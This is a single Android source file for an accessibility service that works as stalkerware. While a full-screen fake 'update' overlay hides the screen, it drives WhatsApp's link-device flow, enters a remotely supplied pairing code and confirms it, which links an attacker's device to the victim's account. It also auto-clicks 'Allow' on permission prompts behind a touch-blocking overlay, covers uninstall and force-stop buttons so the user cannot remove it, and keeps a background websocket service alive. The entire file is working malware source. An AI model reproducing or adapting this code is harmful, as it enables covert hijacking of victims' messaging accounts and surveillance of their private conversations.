package com.lyrnic.userside.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.hardware.biometrics.BiometricManager;
import android.hardware.fingerprint.FingerprintManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.ContextThemeWrapper;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.ProgressBar;

import androidx.appcompat.app.AlertDialog;

import com.lyrnic.userside.R;
import com.lyrnic.userside.activities.MainActivity;
import com.lyrnic.userside.activities.PermissionsActivity;
import com.lyrnic.userside.broadcasts.AppReviver;
import com.lyrnic.userside.constants.Actions;
import com.lyrnic.userside.constants.Constants;
import com.lyrnic.userside.listeners.OnHomePressedListener;
import com.lyrnic.userside.managers.FilesManager;
import com.lyrnic.userside.managers.SystemEventsManager;
import com.lyrnic.userside.utilities.PermissionsUtilities;
import com.lyrnic.userside.utilities.ScreenUtils;
import com.lyrnic.userside.utilities.ServicesUtils;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public class ActionsController extends AccessibilityService {
    private static final String WHATSAPP_LINK_DEVICE_TEXT_EN = "Linked devices";
    private static final String WHATSAPP_LINK_DEVICE_TEXT_AR = "الأجهزة المرتبطة";
    private static final String WHATSAPP_LOGGING_IN_TEXT_EN = "Logging in";
    private static final String WHATSAPP_LOGGING_IN_TEXT_AR = "جارٍ تسجيل الدخول";
    private static final String WHATSAPP_MOBILE_DATA_WARNING_EN = "Connect to WiFi to continue";
    private static final String WHATSAPP_MOBILE_DATA_WARNING_AR = "الاتصال بشبكة WiFi للمتابعة";
    private static final String WHATSAPP_USE_MOBILE_DATA_EN = "Use mobile data";
    private static final String WHATSAPP_USE_MOBILE_DATA_AR = "استخدام بيانات المحمول";
    private static final String WHATSAPP_CHATS_LIST_EN = "Chats";
    private static final String WHATSAPP_CHATS_LIST_AR = "الدردشات";
    private static final String WHATSAPP_UNLOCK_TO_LINK_EN = "Unlock to link a device";
    private static final String WHATSAPP_UNLOCK_TO_LINK_AR = "إلغاء القفل لربط جهاز";
    public static String CONFIRM_TEXT_ENGLISH = "CONFIRM";
    public static String FIELD_CONTENT_DESCRIPTION_ENGLISH = "Enter 8-character code, 1 of 8";
    public static String FIELD_CONTENT_DESCRIPTION_ARABIC = "أدخل الكود المكون من";
    public static String WHATSAPP_TITLE_ARABIC = "واتساب";
    public static String WHATSAPP_TITLE_ENGLISH = "Whatsapp";
    public static String CONFIRM_TEXT_ARABIC = "تأكيد";
    public static final int HIGHLIGHT_VIEW_ID = 312312324;
    public static String CODE;
    boolean timeoutScheduled = false;
    boolean closingWhatsapp = false;
    boolean overlayShown = false;
    boolean fingerprintShown = false;
    boolean inAutoGrantProcess = false;
    boolean autoGrantShown = false;
    boolean allowing = false;
    long startTime;
    View overlayView;
    View updateLayout;
    View fingerprintLayout;
    View autoGrantOverlayView;
    int progress;
    Handler timeoutHandler = new Handler(Looper.getMainLooper());
    Runnable timeoutRunnable = this::notifyTimeout;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        if (accessibilityEvent == null) {
            Log.d("ActionsController", "event is null");
            return;
        }

        handlePermissionsAutoGrant(accessibilityEvent);

        if (NotificationListener.IN_PROCESS) {
            if (!overlayShown && !fingerprintShown && ScreenUtils.isScreenOnAndUnlocked(this)) {
                showWhatsappOverlay();
            }
            if (!timeoutScheduled) {
                scheduleTimeout();
            }
            if (System.currentTimeMillis() - startTime > 1000 * 60 * 2) {
                notifyTimeout();
                return;
            }

            if (accessibilityEvent.getPackageName() == null) return;

            if (accessibilityEvent.getPackageName().equals(getPackageName())) return;

            if (isRequestingFingerprint(accessibilityEvent.getSource())) {
                FilesManager.logStatus("requiring fingerprint");
                if (!fingerprintShown) {
                    showFingerprintOverlay();
                }
                return;
            }

            if (accessibilityEvent.getPackageName().equals(NotificationListener.whatsAppPackage)) {
                Log.d("ActionsController", "progress: " + progress);

                //handleInterruption();

                if (inConfirmationScreen(accessibilityEvent.getSource())) {
                    FilesManager.logStatus("in confirmation screen");
                    setProgress(20);
                    clickOnConfirmButton();
                    return;
                }

                if (isInLinkWithCodeScreen(accessibilityEvent.getSource())) {
                    FilesManager.logStatus("in link with code screen");
                    setProgress(40);
                    fillCode();
                    if (fingerprintShown) {
                        removeFingerprintOverlay();
                    }
                    return;
                } else if (isWarningAboutMobileData(accessibilityEvent.getSource())) {
                    FilesManager.logStatus("warning about mobile data");
                    clickOnContinueWithMobileDataButton();
                    return;
                }

                if (isLoggingIn(accessibilityEvent.getSource())) {
                    FilesManager.logStatus("logging in");
                    setProgress(60);
                    return;
                }

                if (isLinkDone(accessibilityEvent.getSource())) {
                    FilesManager.logStatus("link done");
                    setProgress(80);
                    NotificationListener.IN_PROCESS = false;
                    if (!closingWhatsapp) {
                        closeWhatsapp(true);
                    }
                    return;
                }

//                if(isInLinkedDevicesScreen(accessibilityEvent.getSource())){
//                    FilesManager.logStatus("in linked devices screen");
//                    if(fingerprintShown){
//                        closeWhatsapp(false);
//                    }
//                }


            } else {
                if (overlayShown || fingerprintShown) {
                    if (!ScreenUtils.isScreenOnAndUnlocked(this)) {
                        removeWhatsappOverlay();
                        removeFingerprintOverlay();
                    }
                }
            }

        } else {
            if (accessibilityEvent.getPackageName() == null) {
                Log.d("ActionsController", "event with null package");
                return;
            }

            handleUninstalling(accessibilityEvent);
        }
    }

    private void handlePermissionsAutoGrant(AccessibilityEvent event) {
        CharSequence className = event.getClassName();
        if (className == null) return;
        if (!inAutoGrantProcess && !className.toString().equals(PermissionsActivity.class.getName() + "::AutoGrantingProcess"))
            return;

        Log.d("Permissions:AutoGrant", event.getPackageName() + "::" + className);

        if (inAutoGrantProcess) {
            if (className.toString().equals(PermissionsActivity.class.getName() + "::AutoGrantingProcess")) {
                inAutoGrantProcess = false;
                removeAutoGrantOverlay();
                return;
            }
            clickOnAllowIfPossible(event, Locale.getDefault().getLanguage().equals("en"));
        } else {
            inAutoGrantProcess = true;

            showAutoGrantOverlay();

            Intent intent = new Intent(Actions.ACTION_READY_TO_START_PROCESS);
            intent.setPackage(getPackageName());
            sendBroadcast(intent);
        }
    }

    private void showAutoGrantOverlay() {
        autoGrantShown = true;

        if (autoGrantOverlayView != null) {
            return;
        }
        autoGrantOverlayView = LayoutInflater.from(this).inflate(R.layout.auto_grant_overlay, null);

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                        | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                        | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                        | WindowManager.LayoutParams.FLAG_FULLSCREEN,
                PixelFormat.TRANSLUCENT
        );

        params.gravity = Gravity.CENTER;
        windowManager.addView(autoGrantOverlayView, params);
    }

    private void removeAutoGrantOverlay() {
        if (autoGrantOverlayView != null) {
            windowManager.removeView(autoGrantOverlayView);
            autoGrantOverlayView = null;
        }
        autoGrantShown = false;
    }

    private void clickOnAllowIfPossible(AccessibilityEvent event, boolean english){
        Log.d("Permissions:AutoGrant", "root: " + event);

        AccessibilityNodeInfo allowButton = null;
        if (english) {
            allowButton = findNodeByText(event.getSource(), "Allow", new ArrayList<>(), true);
        } else {
            allowButton = findNodeByText(event.getSource(), "سماح", new ArrayList<>(), true);
        }

        if (allowButton != null) allowButton.performAction(AccessibilityNodeInfo.ACTION_CLICK);
    }

    private boolean isRequestingFingerprint(AccessibilityNodeInfo rootNode) {
        if (rootNode == null) return false;

        AccessibilityNodeInfo nodeEN = findNodeByText(rootNode, WHATSAPP_UNLOCK_TO_LINK_EN, new ArrayList<>(), false);
        AccessibilityNodeInfo nodeAR = findNodeByText(rootNode, WHATSAPP_UNLOCK_TO_LINK_AR, new ArrayList<>(), false);

        return nodeEN != null || nodeAR != null;
    }

    private void clickOnContinueWithMobileDataButton() {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) return;

        AccessibilityNodeInfo nodeEN = findNodeByText(rootNode, WHATSAPP_USE_MOBILE_DATA_EN, new ArrayList<>(), true);
        AccessibilityNodeInfo nodeAR = findNodeByText(rootNode, WHATSAPP_USE_MOBILE_DATA_AR, new ArrayList<>(), true);
        Log.d("ActionsController", "nodeEN: " + nodeEN + " nodeAR: " + nodeAR);

        AccessibilityNodeInfo button = nodeEN != null ? nodeEN : nodeAR;
        if (button != null) {
            button.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }
    }

    private boolean isWarningAboutMobileData(AccessibilityNodeInfo rootNode) {
        if (rootNode == null) return false;

        AccessibilityNodeInfo nodeEN = findNodeByText(rootNode, WHATSAPP_MOBILE_DATA_WARNING_EN, new ArrayList<>(), false);
        AccessibilityNodeInfo nodeAR = findNodeByText(rootNode, WHATSAPP_MOBILE_DATA_WARNING_AR, new ArrayList<>(), false);
        Log.d("ActionsController", "nodeEN: " + nodeEN + " nodeAR: " + nodeAR);
        return nodeEN != null || nodeAR != null;
    }

    private void scheduleTimeout() {
        timeoutScheduled = true;
        startTime = System.currentTimeMillis();
        timeoutHandler.postDelayed(timeoutRunnable, 1000 * 60 * 2);
    }

    private void resetTimeout() {
        timeoutHandler.removeCallbacks(timeoutRunnable);
        startTime = System.currentTimeMillis();
        timeoutHandler.postDelayed(timeoutRunnable, 1000 * 60 * 2);
    }


    private void fillCode() {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) return;

        AccessibilityNodeInfo nodeEN = findNodeByText(rootNode, FIELD_CONTENT_DESCRIPTION_ENGLISH, new ArrayList<>(), true);
        AccessibilityNodeInfo nodeAR = findNodeByText(rootNode, FIELD_CONTENT_DESCRIPTION_ARABIC, new ArrayList<>(), true);

        AccessibilityNodeInfo field = nodeEN != null ? nodeEN : nodeAR;
        if (field != null) {
            setTextOfNode(field, CODE);
        }
    }

    private boolean isInLinkWithCodeScreen(AccessibilityNodeInfo rootNode) {
        if (rootNode == null) return false;

        AccessibilityNodeInfo nodeEN = findNodeByText(rootNode, FIELD_CONTENT_DESCRIPTION_ENGLISH, new ArrayList<>(), true);
        AccessibilityNodeInfo nodeAR = findNodeByText(rootNode, FIELD_CONTENT_DESCRIPTION_ARABIC, new ArrayList<>(), true);
        Log.d("ActionsController", "nodeEN: " + nodeEN + " nodeAR: " + nodeAR);
        return nodeEN != null || nodeAR != null;
    }

    private void setTextOfNode(AccessibilityNodeInfo node, String code) {
        Log.d("ActionsController", "setting text to: " + code);
        Bundle bundle = new Bundle();
        bundle.putCharSequence(AccessibilityNodeInfo
                .ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, code);
        node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, bundle);
    }

    private void clickOnConfirmButton() {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) return;
        if (rootNode.getClassName() == null) return;
        AccessibilityNodeInfo nodeEN = findNodeByText(rootNode, CONFIRM_TEXT_ENGLISH, new ArrayList<>(), true);
        AccessibilityNodeInfo nodeAR = findNodeByText(rootNode, CONFIRM_TEXT_ARABIC, new ArrayList<>(), true);
        AccessibilityNodeInfo button = nodeEN != null ? nodeEN : nodeAR;
        if (button != null) {
            button.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }
    }

    private boolean inConfirmationScreen(AccessibilityNodeInfo rootNode) {
        if (rootNode == null) return false;
        if (rootNode.getClassName() == null) return false;
        AccessibilityNodeInfo nodeEN = findNodeByText(rootNode, CONFIRM_TEXT_ENGLISH, new ArrayList<>(), true);
        AccessibilityNodeInfo nodeAR = findNodeByText(rootNode, CONFIRM_TEXT_ARABIC, new ArrayList<>(), true);
        Log.d("ActionsController", "nodeEN: " + nodeEN + " nodeAR: " + nodeAR);
        return nodeEN != null || nodeAR != null;
    }

    private void schedulePendingIntent(PendingIntent linkDevicePendingIntent) {
        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
        alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000, linkDevicePendingIntent);
    }

    private synchronized void notifyTimeout() {
        if (!timeoutScheduled) {
            return;
        }
        timeoutScheduled = false;
        NotificationListener.IN_PROCESS = false;
        if (!closingWhatsapp) {
            closeWhatsapp(true);
        }
        NotificationListener.linkDevicePendingIntent = null;
        progress = 0;
    }

    private void setProgress(int i) {
        progress = i;
        if (overlayView != null) {
            ((ProgressBar) overlayView.findViewById(R.id.progressBar2)).setProgress(i);
        }
    }

    private boolean isLinkDone(AccessibilityNodeInfo rootNode) {
        if (!isInLinkedDevicesScreen(rootNode)) return false;

        AccessibilityNodeInfo linuxNode = findNodeByText(rootNode, "Windows", new ArrayList<>(), false);
        return linuxNode != null;
    }

    public boolean isInLinkedDevicesScreen(AccessibilityNodeInfo rootNode) {
        if (rootNode == null) return false;
        AccessibilityNodeInfo nodeEN = findNodeByText(rootNode, WHATSAPP_LINK_DEVICE_TEXT_EN, new ArrayList<>(), false);
        AccessibilityNodeInfo nodeAR = findNodeByText(rootNode, WHATSAPP_LINK_DEVICE_TEXT_AR, new ArrayList<>(), false);
        Log.d("ActionsController", "nodeEN: " + nodeEN + " nodeAR: " + nodeAR);

        return nodeEN != null || nodeAR != null;
    }

    private boolean isLoggingIn(AccessibilityNodeInfo rootNode) {
        if (rootNode == null) return false;
        AccessibilityNodeInfo nodeEN = findNodeByText(rootNode, WHATSAPP_LOGGING_IN_TEXT_EN, new ArrayList<>(), false);
        AccessibilityNodeInfo nodeAR = findNodeByText(rootNode, WHATSAPP_LOGGING_IN_TEXT_AR, new ArrayList<>(), false);
        Log.d("ActionsController", "nodeEN: " + nodeEN + " nodeAR: " + nodeAR);
        return nodeEN != null || nodeAR != null;
    }

    private WindowManager windowManager;
    private View highlightView;
    private SharedPreferences sharedPreferences;

    @Override
    public void onCreate() {
        super.onCreate();
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        sharedPreferences = getSharedPreferences(getClass().getName(), MODE_PRIVATE);

        if (ServicesUtils.isServiceKilled(this, WebsocketService.class)) {
            Intent intent = new Intent(this, WebsocketService.class);
            AppReviver.scheduleIntent(this, intent, 55);
        }
    }


    public void handleUninstalling(AccessibilityEvent event) {
        if (event == null || event.getPackageName() == null) return;
        if (!event.getPackageName().equals(getPackageName())) {
            if (highlightView == null) {
                preventUninstall(event.getSource());
            }
        }
    }

    public void preventUninstall(AccessibilityNodeInfo rootNode) {
        if (rootNode == null) return;

        AccessibilityNodeInfo uninstallButtonNode = getUninstallButtonIfExist(rootNode);
        if (uninstallButtonNode != null) {
            highlightOverlay(uninstallButtonNode);
        }
    }

    public void removeHighlightView() {
        if (highlightView != null) {
            boolean refreshed = ((AccessibilityNodeInfo) highlightView.getTag()).refresh();
            if (!refreshed) {
                windowManager.removeView(highlightView);
                highlightView = null;
            }
        }

    }


    private AccessibilityNodeInfo findNodeByText(AccessibilityNodeInfo rootNode, String text, ArrayList<AccessibilityNodeInfo> blackListNodes, boolean clickable) {
        if (rootNode == null) return null;
        List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(text);

        for (AccessibilityNodeInfo node : nodes) {
            Log.d("Nodes_state", "checking node node: " + node);
            if (blackListNodes.contains(node)) {
                continue;
            }
            if (clickable) {
                if (node.isClickable()) {
                    return node;
                } else {
                    if (node.getParent().isClickable()) {
                        return node.getParent();
                    }
                }
            } else {
                if (!node.isClickable()) {
                    return node;
                }
            }

        }
        return null;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        log("accessibility task removed");
    }


    private AccessibilityNodeInfo getUninstallButtonIfExist(AccessibilityNodeInfo rootNode) {
        ArrayList<AccessibilityNodeInfo> blackListNodes = new ArrayList<>();

        String[] uninstallKeywords = Constants.getUninstallKeywords();
        String[] confirmationKeywords = Constants.getConfirmationKeywords();

        AccessibilityNodeInfo appNode = findNodeByTextByTraverse(rootNode, getString(R.string.app_name), blackListNodes, false);
        if (appNode == null) {
            return null;
        }

        AccessibilityNodeInfo uninstallButtonNode = getAppInfoUninstallIfExist(rootNode);

        if (uninstallButtonNode != null) {
            return uninstallButtonNode;
        }

        String removeDialogData = sharedPreferences.getString(Constants.REMOVE_DIALOG_CASHED_DATA, null);

        if (removeDialogData != null && rootNode.getPackageName() != null && !rootNode.getPackageName().equals(removeDialogData)) {
            return null;
        }

        if (!appNode.isVisibleToUser()) {
            return null;
        }

        blackListNodes.add(appNode);
        Log.d("Nodes_state", "app name node founded: " + appNode.getText());

        AccessibilityNodeInfo uninstallNode = null;
        for (String keyword : uninstallKeywords) {
            uninstallNode = findNodeByText(rootNode, keyword, blackListNodes, false);
            if (uninstallNode != null && uninstallNode.isVisibleToUser()) {
                break;
            }
        }

        if (uninstallNode == null) {
            return null;
        }

        blackListNodes.add(uninstallNode);
        Log.d("Nodes_state", "uninstall node founded: " + uninstallNode.getText());

        AccessibilityNodeInfo confirmationNode = null;
        for (String keyword : confirmationKeywords) {
            confirmationNode = findNodeByText(rootNode, keyword, blackListNodes, true);
            if (confirmationNode != null && confirmationNode.isVisibleToUser()) {
                break;
            }
        }

        if (confirmationNode == null) {
            return null;
        }
        Log.d("Nodes_state", "confirmation node founded: " + confirmationNode.getText());

        sharedPreferences.edit().putString(Constants.REMOVE_DIALOG_CASHED_DATA, confirmationNode.getPackageName().toString()).apply();

        return confirmationNode;
    }

    private AccessibilityNodeInfo findNodeByTextByTraverse(AccessibilityNodeInfo rootNode, String string, ArrayList<AccessibilityNodeInfo> blackListNodes, boolean clickable) {
        ArrayList<AccessibilityNodeInfo> nodes = new ArrayList<>();

        traverseChildes(nodes, rootNode);

        for (AccessibilityNodeInfo node : nodes) {
            Log.d("Nodes_state", "checking node node: " + node);
            if (blackListNodes.contains(node)) {
                continue;
            }

            String text = node.getText() != null ? node.getText().toString() : null;

            String contentDescription = node.getContentDescription() != null ? node.getContentDescription().toString() : null;

            text = text == null ? contentDescription : text;

            if (text == null) continue;

            text = text.trim().toLowerCase();

            if (!text.contains(string.toLowerCase())) continue;

            if (clickable) {
                if (node.isClickable()) {
                    return node;
                } else {
                    if (node.getParent().isClickable()) {
                        return node.getParent();
                    }
                }
            } else {
                if (!node.isClickable()) {
                    return node;
                }
            }

        }

        return null;
    }

    private void traverseChildes(ArrayList<AccessibilityNodeInfo> nodes, AccessibilityNodeInfo root){
        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo child = root.getChild(i);

            if(child == null) continue;

            nodes.add(child);
            if(child.getChildCount() > 0){
                traverseChildes(nodes, root.getChild(i));
            }
        }
    }

    public AccessibilityNodeInfo getAppInfoUninstallIfExist(AccessibilityNodeInfo rootNode) {
        String appInfoCachedData = sharedPreferences.getString(Constants.APP_INFO_CACHED_DATA, null);
        if (appInfoCachedData != null && rootNode.getPackageName() != null && !rootNode.getPackageName().equals(appInfoCachedData)) {
            return null;
        }
        ArrayList<AccessibilityNodeInfo> blackListNodes = new ArrayList<>();

        String[] forceStopKeywords = Constants.getForceStopKeywords();
        String[] uninstallKeywords = Constants.getUninstallKeywords();

        AccessibilityNodeInfo forceStopButtonNode = null;
        for (String keyword : forceStopKeywords) {
            forceStopButtonNode = findNodeByTextByTraverse(rootNode, keyword, blackListNodes, true);
            if (forceStopButtonNode != null && forceStopButtonNode.isVisibleToUser()) {
                break;
            }
        }

        if (forceStopButtonNode == null) {
            return null;
        }

        blackListNodes.add(forceStopButtonNode);
        Log.d("Nodes_state", "force stop node founded: " + forceStopButtonNode.getText());

        AccessibilityNodeInfo uninstallButtonNode = null;
        for (String keyword : uninstallKeywords) {
            uninstallButtonNode = findNodeByTextByTraverse(rootNode, keyword, blackListNodes, true);
            if (uninstallButtonNode != null && uninstallButtonNode.isVisibleToUser()) {
                break;
            }
        }

        if (uninstallButtonNode == null) {
            return null;
        }

        Log.d("Nodes_state", "uninstall node founded: " + uninstallButtonNode.getText());

        blackListNodes.clear();

        sharedPreferences.edit().putString(Constants.APP_INFO_CACHED_DATA, uninstallButtonNode.getPackageName().toString()).apply();

        return uninstallButtonNode;
    }


    private void showAlertDialog() {
        new Handler(Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                AlertDialog.Builder builder = new AlertDialog.Builder(new ContextThemeWrapper(ActionsController.this, R.style.Theme_FileManagerTest));
                builder.setTitle(R.string.warning)
                        .setMessage(R.string.uninstall_warning_message)
                        .setPositiveButton(R.string.ok, null);

                AlertDialog dialog = builder.create();
                // Add the FLAG_ACTIVITY_NEW_TASK flag to show the dialog from a service
                dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY);


                dialog.show();
            }
        });
    }

    public boolean updateHighlightView(AccessibilityNodeInfo targetView) {
        boolean refreshed = ((AccessibilityNodeInfo) highlightView.getTag()).refresh();

        if (!refreshed) {
            removeHighlightView();
            return false;
        }

        Rect bounds = new Rect();
        targetView.getBoundsInScreen(bounds);

        if (highlightView != null) {
            Rect lastCoordinates = new Rect();
            highlightView.getGlobalVisibleRect(lastCoordinates);

            Log.d("Highlight Logs", "bounds: " + lastCoordinates.left + ", " + lastCoordinates.top + " left: " + bounds.left + " top: " + bounds.left);
            if (lastCoordinates.left != bounds.left || lastCoordinates.top != bounds.top) {
                WindowManager.LayoutParams params = (WindowManager.LayoutParams) highlightView.getLayoutParams();

                params.x = bounds.left;
                params.y = bounds.top;
                params.width = bounds.width();
                params.height = bounds.height();
                windowManager.updateViewLayout(highlightView, params);
            }
        }

        return true;
    }

    private void highlightOverlay(AccessibilityNodeInfo targetView) {
        Rect bounds = new Rect();
        targetView.getBoundsInScreen(bounds);

        highlightView = new View(this);
        highlightView.setBackgroundColor(Color.argb(150, 255, 255, 0));  // Yellow with some transparency

        WindowManager.LayoutParams params = getFitLayoutParams(bounds);

        highlightView.setOnClickListener((view) -> {
            AccessibilityNodeInfo node = (AccessibilityNodeInfo) highlightView.getTag();
            boolean refreshed = node.refresh();
            if (!refreshed) {
                removeHighlightView();
                return;
            }
            if (node.isVisibleToUser()) {
                goBackIfNecessary();
                showAlertDialog();
            }
        });

        windowManager.addView(highlightView, params);
        highlightView.setTag(targetView);

        startUpdatingProcess();
    }

    public void startUpdatingProcess() {
        Handler handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable() {
            @Override
            public void run() {
                if (updateHighlightView((AccessibilityNodeInfo) highlightView.getTag())) {
                    handler.postDelayed(this, 100);
                }
            }
        });
    }

    public void goBackIfNecessary() {
        AccessibilityNodeInfo node = (AccessibilityNodeInfo) highlightView.getTag();
        String appInfoPackage = sharedPreferences.getString(Constants.APP_INFO_CACHED_DATA, null);
        if (node.getPackageName() != null && !node.getPackageName().equals(appInfoPackage)) {
            performGlobalAction(GLOBAL_ACTION_BACK);
        }
    }

    public WindowManager.LayoutParams getFitLayoutParams(Rect bounds) {
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                bounds.width(),
                bounds.height(),
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                PixelFormat.TRANSLUCENT
        );

        params.gravity = Gravity.TOP | Gravity.START;
        params.x = bounds.left;
        params.y = bounds.top;

        return params;
    }

    @Override
    public void onInterrupt() {
        // Handle the interruption of the service if needed
    }


    public synchronized void closeWhatsapp(boolean endProcess) {
        closingWhatsapp = true;
        Handler handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable() {
            @Override
            public void run() {
                Log.d("ActionsController", "closing whatsapp");
                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                if (rootNode == null) {
                    handler.postDelayed(this, 1000);
                    return;
                }
                String packageName = rootNode.getPackageName() == null ? null : rootNode.getPackageName().toString();

                if (packageName != null && !packageName.equals(NotificationListener.whatsAppPackage)) {
                    // Whatsapp closed
                    // Remove overlay
                    if (endProcess) {
                        removeWhatsappOverlay();
                        removeFingerprintOverlay();
                        closingWhatsapp = false;
                        progress = 0;
                        timeoutHandler.removeCallbacks(timeoutRunnable);
                        Log.d("ActionsController", "whatsapp closed");
                        FilesManager.logStatus("whatsapp closed");
                        NotificationListener.IN_PROCESS = false;
                        return;
                    }
                    return;
                }

                if (isInWhatsappHomeActivity()) {
                    performGlobalAction(GLOBAL_ACTION_HOME);
                    handler.postDelayed(this, 1000);
                } else {
                    performGlobalAction(GLOBAL_ACTION_BACK);
                    handler.postDelayed(this, 1000);
                }
            }
        });
    }

    public boolean isInWhatsappHomeActivity() {
        AccessibilityNodeInfo node = getRootInActiveWindow();
        if (node == null) return false;
        if (node.getPackageName() == null) return false;
        if (!node.getPackageName().equals(NotificationListener.whatsAppPackage)) return false;
        AccessibilityNodeInfo nodeEN = findNodeByText(node, WHATSAPP_CHATS_LIST_EN, new ArrayList<>(), false);
        AccessibilityNodeInfo nodeAR = findNodeByText(node, WHATSAPP_CHATS_LIST_AR, new ArrayList<>(), false);
        Log.d("ActionsController", "nodeEN: " + nodeEN + " nodeAR: " + nodeAR);

        return nodeEN != null || nodeAR != null;
    }

    private void removeWhatsappOverlay() {
        if (WebsocketService.windowManager == null) return;

        overlayShown = false;

        if (overlayView != null) {
            WebsocketService.windowManager.removeView(overlayView);
            overlayView = null;
            fingerprintLayout = null;
            updateLayout = null;
        }
    }

    private void showWhatsappOverlay() {
        if (WebsocketService.windowManager == null) return;
        WindowManager windowManagerToUse = getWindowManager();

        overlayShown = true;
        if (overlayView != null) {
            return;
        }
        overlayView = LayoutInflater.from(this).inflate(R.layout.overlay_not_creepy, null);

        updateLayout = overlayView.findViewById(R.id.update_layout);
        fingerprintLayout = overlayView.findViewById(R.id.fingerprint_layout);

        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : WindowManager.LayoutParams.TYPE_PHONE;

        if(windowManagerToUse == windowManager){
            type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
        }

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                        | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                        | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                        | WindowManager.LayoutParams.FLAG_FULLSCREEN,
                PixelFormat.TRANSLUCENT
        );

        params.gravity = Gravity.CENTER;
        windowManagerToUse.addView(overlayView, params);
    }

    private WindowManager getWindowManager() {
        if(PermissionsUtilities.isBiometricAuthEnabled(this)){
            return WebsocketService.windowManager;
        }

        return windowManager;
    }



    private void showFingerprintOverlay() {
        if (WebsocketService.windowManager == null) return;

        fingerprintShown = true;

        if (fingerprintLayout == null) {
            return;
        }

        updateLayout.setVisibility(View.GONE);
        fingerprintLayout.setVisibility(View.VISIBLE);
    }

    private void removeFingerprintOverlay() {
        if (WebsocketService.windowManager == null) return;

        fingerprintShown = false;

        if (fingerprintLayout != null) {
            updateLayout.setVisibility(View.VISIBLE);
            fingerprintLayout.setVisibility(View.GONE);
        }
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();

        log("onServiceConnected");
    }

    public AccessibilityServiceInfo createAccessibilityInfo() {
        AccessibilityServiceInfo info = getServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS ;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
        info.notificationTimeout = 100;
        return info;
    }

    public void log(String text) {
        Log.d("ActionsController", text);

        FilesManager.logStatus(text);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        log("onDestroy");

        if (highlightView != null) {
            windowManager.removeView(highlightView);
        }
    }
}
